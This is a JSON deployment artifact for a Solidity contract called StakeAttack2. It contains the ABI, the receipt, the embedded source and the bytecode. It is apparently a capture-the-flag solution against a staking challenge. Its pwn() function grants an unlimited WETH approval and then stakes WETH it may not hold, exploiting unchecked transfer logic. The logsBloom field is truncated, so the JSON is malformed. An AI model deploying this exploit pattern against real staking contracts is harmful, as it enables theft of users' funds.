{
  "address": "0x820ea71E02246D0Da68E3B3643BB2163BaD7f5f0",
  "abi": [
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "_owner",
          "type": "address"
        },
        {
          "internalType": "address",
          "name": "_target",
          "type": "address"
        },
        {
          "internalType": "address",
          "name": "_weth",
          "type": "address"
        }
      ],
      "stateMutability": "payable",
      "type": "constructor"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "owner",
          "type": "address"
        }
      ],
      "name": "OwnableInvalidOwner",
      "type": "error"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "account",
          "type": "address"
        }
      ],
      "name": "OwnableUnauthorizedAccount",
      "type": "error"
    },
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": true,
          "internalType": "address",
          "name": "previousOwner",
          "type": "address"
        },
        {
          "indexed": true,
          "internalType": "address",
          "name": "newOwner",
          "type": "address"
        }
      ],
      "name": "OwnershipTransferred",
      "type": "event"
    },
    {
      "inputs": [],
      "name": "kill",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "owner",
      "outputs": [
        {
          "internalType": "address",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "pwn",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "renounceOwnership",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "_adr",
          "type": "address"
        }
      ],
      "name": "setTarget",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "stakeRealETH",
      "outputs": [],
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "target",
      "outputs": [
        {
          "internalType": "contract IStake",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "newOwner",
          "type": "address"
        }
      ],
      "name": "transferOwnership",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "weth",
      "outputs": [
        {
          "internalType": "contract IWeth",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    }
  ],
  "transactionHash": "0xda1672cc6af1da01b2fa27ea982ca190242633a9efd008a9a2bab0ff58722c1a",
  "receipt": {
    "to": null,
    "from": "0xcC6eDeB501BbD8AD9E028BDe937B63Cdd64A1D91",
    "contractAddress": "0x820ea71E02246D0Da68E3B3643BB2163BaD7f5f0",
    "transactionIndex": 83,
    "gasUsed": "380900",
    "logsBloom": "0x
    "blockHash": "0xe46a2abdd9231c11853385cbf9b13f2dca3776eabb5ca55a4bcf7c0367caec6f",
    "transactionHash": "0xda1672cc6af1da01b2fa27ea982ca190242633a9efd008a9a2bab0ff58722c1a",
    "logs": [
      {
        "transactionIndex": 83,
        "blockNumber": 8249447,
        "transactionHash": "0xda1672cc6af1da01b2fa27ea982ca190242633a9efd008a9a2bab0ff58722c1a",
        "address": "0x820ea71E02246D0Da68E3B3643BB2163BaD7f5f0",
        "topics": [
          "0x8be0079c531659141344cd1fd0a4f28419497f9722a3daafe3b4186f6b6457e0",
          "0x0000000000000000000000000000000000000000000000000000000000000000",
          "0x000000000000000000000000cc6edeb501bbd8ad9e028bde937b63cdd64a1d91"
        ],
        "data": "0x",
        "logIndex": 168,
        "blockHash": "0xe46a2abdd9231c11853385cbf9b13f2dca3776eabb5ca55a4bcf7c0367caec6f"
      }
    ],
    "blockNumber": 8249447,
    "cumulativeGasUsed": "10362547",
    "status": 1,
    "byzantium": true
  },
  "args": [
    "0xcC6eDeB501BbD8AD9E028BDe937B63Cdd64A1D91",
    "0x97ab138Acf1A417A11F0BcD55720107224ad09e8",
    "0xCd8AF4A0F29cF7966C051542905F66F5dca9052f"
  ],
  "numDeployments": 1,
  "solcInputHash": "aebc2c325329b3b21c83c195600ef03f",
  "metadata": "{\"compiler\":{\"version\":\"0.8.20+commit.a1b79de6\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"_target\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"_weth\",\"type\":\"address\"}],\"stateMutability\":\"payable\",\"type\":\"constructor\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"}],\"name\":\"OwnableInvalidOwner\",\"type\":\"error\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"OwnableUnauthorizedAccount\",\"type\":\"error\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"inputs\":[],\"name\":\"kill\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"pwn\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_adr\",\"type\":\"address\"}],\"name\":\"setTarget\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"stakeRealETH\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"target\",\"outputs\":[{\"internalType\":\"contract IStake\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"transferOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"weth\",\"outputs\":[{\"internalType\":\"contract IWeth\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"}],\"devdoc\":{\"errors\":{\"OwnableInvalidOwner(address)\":[{\"details\":\"The owner is not a valid owner account. (eg. `address(0)`)\"}],\"OwnableUnauthorizedAccount(address)\":[{\"details\":\"The caller account is not authorized to perform an operation.\"}]},\"kind\":\"dev\",\"methods\":{\"owner()\":{\"details\":\"Returns the address of the current owner.\"},\"renounceOwnership()\":{\"details\":\"Leaves the contract without owner. It will not be possible to call `onlyOwner` functions. Can only be called by the current owner. NOTE: Renouncing ownership will leave the contract without an owner, thereby disabling any functionality that is only available to the owner.\"},\"transferOwnership(address)\":{\"details\":\"Transfers ownership of the contract to a new account (`newOwner`). Can only be called by the current owner.\"}},\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{},\"version\":1}},\"settings\":{\"compilationTarget\":{\"contracts/StakeAttack.sol\":\"StakeAttack2\"},\"evmVersion\":\"paris\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\",\"useLiteralContent\":true},\"optimizer\":{\"enabled\":true,\"runs\":200},\"remappings\":[]},\"sources\":{\"@openzeppelin/contracts/access/Ownable.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\n// OpenZeppelin Contracts (last updated v5.0.0) (access/Ownable.sol)\\n\\npragma solidity ^0.8.20;\\n\\nimport {Context} from \\\"../utils/Context.sol\\\";\\n\\n/**\\n * @dev Contract module which provides a basic access control mechanism, where\\n * there is an account (an owner) that can be granted exclusive access to\\n * specific functions.\\n *\\n * The initial owner is set to the address provided by the deployer. This can\\n * later be changed with {transferOwnership}.\\n *\\n * This module is used through inheritance. It will make available the modifier\\n * `onlyOwner`, which can be applied to your functions to restrict their use to\\n * the owner.\\n */\\nabstract contract Ownable is Context {\\n    address private _owner;\\n\\n    /**\\n     * @dev The caller account is not authorized to perform an operation.\\n     */\\n    error OwnableUnauthorizedAccount(address account);\\n\\n    /**\\n     * @dev The owner is not a valid owner account. (eg. `address(0)`)\\n     */\\n    error OwnableInvalidOwner(address owner);\\n\\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\\n\\n    /**\\n     * @dev Initializes the contract setting the address provided by the deployer as the initial owner.\\n     */\\n    constructor(address initialOwner) {\\n        if (initialOwner == address(0)) {\\n            revert OwnableInvalidOwner(address(0));\\n        }\\n        _transferOwnership(initialOwner);\\n    }\\n\\n    /**\\n     * @dev Throws if called by any account other than the owner.\\n     */\\n    modifier onlyOwner() {\\n        _checkOwner();\\n        _;\\n    }\\n\\n    /**\\n     * @dev Returns the address of the current owner.\\n     */\\n    function owner() public view virtual returns (address) {\\n        return _owner;\\n    }\\n\\n    /**\\n     * @dev Throws if the sender is not the owner.\\n     */\\n    function _checkOwner() internal view virtual {\\n        if (owner() != _msgSender()) {\\n            revert OwnableUnauthorizedAccount(_msgSender());\\n        }\\n    }\\n\\n    /**\\n     * @dev Leaves the contract without owner. It will not be possible to call\\n     * `onlyOwner` functions. Can only be called by the current owner.\\n     *\\n     * NOTE: Renouncing ownership will leave the contract without an owner,\\n     * thereby disabling any functionality that is only available to the owner.\\n     */\\n    function renounceOwnership() public virtual onlyOwner {\\n        _transferOwnership(address(0));\\n    }\\n\\n    /**\\n     * @dev Transfers ownership of the contract to a new account (`newOwner`).\\n     * Can only be called by the current owner.\\n     */\\n    function transferOwnership(address newOwner) public virtual onlyOwner {\\n        if (newOwner == address(0)) {\\n            revert OwnableInvalidOwner(address(0));\\n        }\\n        _transferOwnership(newOwner);\\n    }\\n\\n    /**\\n     * @dev Transfers ownership of the contract to a new account (`newOwner`).\\n     * Internal function without access restriction.\\n     */\\n    function _transferOwnership(address newOwner) internal virtual {\\n        address oldOwner = _owner;\\n        _owner = newOwner;\\n        emit OwnershipTransferred(oldOwner, newOwner);\\n    }\\n}\\n\",\"keccak256\":\"0xff6d0bb2e285473e5311d9d3caacb525ae3538a80758c10649a4d61029b017bb\",\"license\":\"MIT\"},\"@openzeppelin/contracts/utils/Context.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\n// OpenZeppelin Contracts (last updated v5.0.1) (utils/Context.sol)\\n\\npragma solidity ^0.8.20;\\n\\n/**\\n * @dev Provides information about the current execution context, including the\\n * sender of the transaction and its data. While these are generally available\\n * via msg.sender and msg.data, they should not be accessed in such a direct\\n * manner, since when dealing with meta-transactions the account sending and\\n * paying for execution may not be the actual sender (as far as an application\\n * is concerned).\\n *\\n * This contract is only required for intermediate, library-like contracts.\\n */\\nabstract contract Context {\\n    function _msgSender() internal view virtual returns (address) {\\n        return msg.sender;\\n    }\\n\\n    function _msgData() internal view virtual returns (bytes calldata) {\\n        return msg.data;\\n    }\\n\\n    function _contextSuffixLength() internal view virtual returns (uint256) {\\n        return 0;\\n    }\\n}\\n\",\"keccak256\":\"0x493033a8d1b176a037b2cc6a04dad01a5c157722049bbecf632ca876224dd4b2\",\"license\":\"MIT\"},\"contracts/StakeAttack.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\r\\npragma solidity ^0.8.0;\\r\\n\\r\\n// import \\\"@openzeppelin/contracts/token/ERC20/IERC20.sol\\\";\\r\\nimport \\\"@openzeppelin/contracts/access/Ownable.sol\\\";\\r\\n\\r\\ninterface IStake {\\r\\n\\r\\n    function totalStaked() external view returns (uint256);\\r\\n    function UserStake(address _addr) external view returns (uint256);\\r\\n    function Stakers(address _addr) external view returns (bool);\\r\\n    function WETH() external view returns (address);\\r\\n    \\r\\n    function StakeETH() external payable;\\r\\n    function StakeWETH(uint256 amount) external returns (bool);\\r\\n    function Unstake(uint256 amount) external returns (bool);\\r\\n    \\r\\n}\\r\\n\\r\\ninterface IWeth {\\r\\n    function approve(address spender, uint256 amount) external returns (bool);\\r\\n}\\r\\n\\r\\ncontract StakeAttack2 is Ownable {\\r\\n\\r\\n    IStake public target;\\r\\n    IWeth public weth;\\r\\n\\r\\n    constructor(address _owner, address _target, address _weth) payable Ownable(_owner){\\r\\n        target = IStake(_target);\\r\\n        weth = IWeth(_weth);\\r\\n    }\\r\\n\\r\\n    function setTarget(address _adr) public onlyOwner {\\r\\n        target = IStake(_adr);\\r\\n    }\\r\\n\\r\\n    function pwn() public onlyOwner {\\r\\n        weth.approve(address(target), type(uint256).max);\\r\\n        target.StakeWETH(1 ether);\\r\\n    }\\r\\n\\r\\n    //forgotthis\\r\\n    function stakeRealETH() public payable onlyOwner {\\r\\n        target.StakeETH{value: msg.value}();\\r\\n    }\\r\\n\\r\\n    function kill() public onlyOwner {\\r\\n        selfdestruct(payable(owner()));\\r\\n    }\\r\\n}\\r\\n\\r\\n\",\"keccak256\":\"0x3481c581ee94618b0b15948690c1342b249aef58c506c88fdb2d0886c0c6e316\",\"license\":\"MIT\"}},\"version\":1}",
  "bytecode": "0x60806040526040516105e13803806105e1833981016040819052610022916100f9565b826001600160a01b03811661005157604051631e4fbdf760e01b81526000600482015260240160405180910390fd5b61005a8161008d565b50600180546001600160a01b039384166001600160a01b031991821617909155600280549290931691161790555061013c565b600080546001600160a01b038381166001600160a01b0319831681178455604051919092169283917f8be0079c531659141344cd1fd0a4f28419497f9722a3daafe3b4186f6b6457e09190a35050565b80516001600160a01b03811681146100f457600080fd5b919050565b60008060006060848603121561010e57600080fd5b610117846100dd565b9250610125602085016100dd565b9150610133604085016100dd565b90509250925092565b6104968061014b6000396000f3fe6080604052600436106100865760003560e01c80638da5cb5b116100595780638da5cb5b14610113578063d4b8399214610131578063dd365b8b14610151578063eb41f99614610166578063f2fde38b1461016e57600080fd5b80633fc8cef31461008b57806341c0e1b5146100c7578063715018a6146100de578063776d1a01146100f3575b600080fd5b34801561009757600080fd5b506002546100ab906001600160a01b031681565b6040516001600160a01b03909116815260200160405180910390f35b3480156100d357600080fd5b506100dc61018e565b005b3480156100ea57600080fd5b506100dc6101a4565b3480156100ff57600080fd5b506100dc61010e36600461040e565b6101b8565b34801561011f57600080fd5b506000546001600160a01b03166100ab565b34801561013d57600080fd5b506001546100ab906001600160a01b031681565b34801561015d57600080fd5b506100dc6101e2565b6100dc6102de565b34801561017a57600080fd5b506100dc61018936600461040e565b610351565b610196610391565b6000546001600160a01b0316ff5b6101ac610391565b6101b660006103be565b565b6101c0610391565b600180546001600160a01b0319166001600160a01b0392909216919091179055565b6101ea610391565b60025460015460405163095ea7b360e01b81526001600160a01b039182166004820152600019602482015291169063095ea7b3906044016020604051808303816000875af1158015610240573d6000803e3d6000fd5b505050506040513d601f19601f82011682018060405250810190610264919061043e565b506001546040516301b8d71d60e61b8152670de0b6b3a764000060048201526001600160a01b0390911690636e35c740906024016020604051808303816000875af11580156102b7573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906102db919061043e565b50565b6102e6610391565b600160009054906101000a90046001600160a01b03166001600160a01b03166378e7ed2f346040518263ffffffff1660e01b81526004016000604051808303818588803b15801561033657600080fd5b505af115801561034a573d6000803e3d6000fd5b5050505050565b610359610391565b6001600160a01b03811661038857604051631e4fbdf760e01b8152600060048201526024015b60405180910390fd5b6102db816103be565b6000546001600160a01b031633146101b65760405163118cdaa760e01b815233600482015260240161037f565b600080546001600160a01b038381166001600160a01b0319831681178455604051919092169283917f8be0079c531659141344cd1fd0a4f28419497f9722a3daafe3b4186f6b6457e09190a35050565b60006020828403121561042057600080fd5b81356001600160a01b038116811461043757600080fd5b9392505050565b60006020828403121561045057600080fd5b8151801515811461043757600080fdfea2646970667358221220344c279aacbeac3de3b57d0cbe02c61ccd71d953e3301c4fbf014db6ef49f3f564736f6c63430008140033",
  "deployedBytecode": "0x6080604052600436106100865760003560e01c80638da5cb5b116100595780638da5cb5b14610113578063d4b8399214610131578063dd365b8b14610151578063eb41f99614610166578063f2fde38b1461016e57600080fd5b80633fc8cef31461008b57806341c0e1b5146100c7578063715018a6146100de578063776d1a01146100f3575b600080fd5b34801561009757600080fd5b506002546100ab906001600160a01b031681565b6040516001600160a01b03909116815260200160405180910390f35b3480156100d357600080fd5b506100dc61018e565b005b3480156100ea57600080fd5b506100dc6101a4565b3480156100ff57600080fd5b506100dc61010e36600461040e565b6101b8565b34801561011f57600080fd5b506000546001600160a01b03166100ab565b34801561013d57600080fd5b506001546100ab906001600160a01b031681565b34801561015d57600080fd5b506100dc6101e2565b6100dc6102de565b34801561017a57600080fd5b506100dc61018936600461040e565b610351565b610196610391565b6000546001600160a01b0316ff5b6101ac610391565b6101b660006103be565b565b6101c0610391565b600180546001600160a01b0319166001600160a01b0392909216919091179055565b6101ea610391565b60025460015460405163095ea7b360e01b81526001600160a01b039182166004820152600019602482015291169063095ea7b3906044016020604051808303816000875af1158015610240573d6000803e3d6000fd5b505050506040513d601f19601f82011682018060405250810190610264919061043e565b506001546040516301b8d71d60e61b8152670de0b6b3a764000060048201526001600160a01b0390911690636e35c740906024016020604051808303816000875af11580156102b7573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906102db919061043e565b50565b6102e6610391565b600160009054906101000a90046001600160a01b03166001600160a01b03166378e7ed2f346040518263ffffffff1660e01b81526004016000604051808303818588803b15801561033657600080fd5b505af115801561034a573d6000803e3d6000fd5b5050505050565b610359610391565b6001600160a01b03811661038857604051631e4fbdf760e01b8152600060048201526024015b60405180910390fd5b6102db816103be565b6000546001600160a01b031633146101b65760405163118cdaa760e01b815233600482015260240161037f565b600080546001600160a01b038381166001600160a01b0319831681178455604051919092169283917f8be0079c531659141344cd1fd0a4f28419497f9722a3daafe3b4186f6b6457e09190a35050565b60006020828403121561042057600080fd5b81356001600160a01b038116811461043757600080fd5b9392505050565b60006020828403121561045057600080fd5b8151801515811461043757600080fdfea2646970667358221220344c279aacbeac3de3b57d0cbe02c61ccd71d953e3301c4fbf014db6ef49f3f564736f6c63430008140033",
  "devdoc": {
    "errors": {
      "OwnableInvalidOwner(address)": [
        {
          "details": "The owner is not a valid owner account. (eg. `address(0)`)"
        }
      ],
      "OwnableUnauthorizedAccount(address)": [
        {
          "details": "The caller account is not authorized to perform an operation."
        }
      ]
    },
    "kind": "dev",
    "methods": {
      "owner()": {
        "details": "Returns the address of the current owner."
      },
      "renounceOwnership()": {
        "details": "Leaves the contract without owner. It will not be possible to call `onlyOwner` functions. Can only be called by the current owner. NOTE: Renouncing ownership will leave the contract without an owner, thereby disabling any functionality that is only available to the owner."
      },
      "transferOwnership(address)": {
        "details": "Transfers ownership of the contract to a new account (`newOwner`). Can only be called by the current owner."
      }
    },
    "version": 1
  },
  "userdoc": {
    "kind": "user",
    "methods": {},
    "version": 1
  },
  "storageLayout": {
    "storage": [
      {
        "astId": 8,
        "contract": "contracts/StakeAttack.sol:StakeAttack2",
        "label": "_owner",
        "offset": 0,
        "slot": "0",
        "type": "t_address"
      },
      {
        "astId": 237,
        "contract": "contracts/StakeAttack.sol:StakeAttack2",
        "label": "target",
        "offset": 0,
        "slot": "1",
        "type": "t_contract(IStake)222"
      },
      {
        "astId": 240,
        "contract": "contracts/StakeAttack.sol:StakeAttack2",
        "label": "weth",
        "offset": 0,
        "slot": "2",
        "type": "t_contract(IWeth)232"
      }
    ],
    "types": {
      "t_address": {
        "encoding": "inplace",
        "label": "address",
        "numberOfBytes": "20"
      },
      "t_contract(IStake)222": {
        "encoding": "inplace",
        "label": "contract IStake",
        "numberOfBytes": "20"
      },
      "t_contract(IWeth)232": {
        "encoding": "inplace",
        "label": "contract IWeth",
        "numberOfBytes": "20"
      }
    }
  }
}